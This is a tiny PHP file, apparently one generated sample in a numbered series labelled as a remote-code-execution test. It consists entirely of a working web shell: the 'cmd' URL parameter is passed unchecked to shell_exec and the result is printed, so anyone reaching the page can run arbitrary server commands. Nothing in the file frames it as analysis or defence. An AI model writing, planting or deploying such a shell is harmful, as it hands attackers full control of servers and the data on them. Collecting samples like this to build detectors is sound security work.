<?php
// RCE test variation #596
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>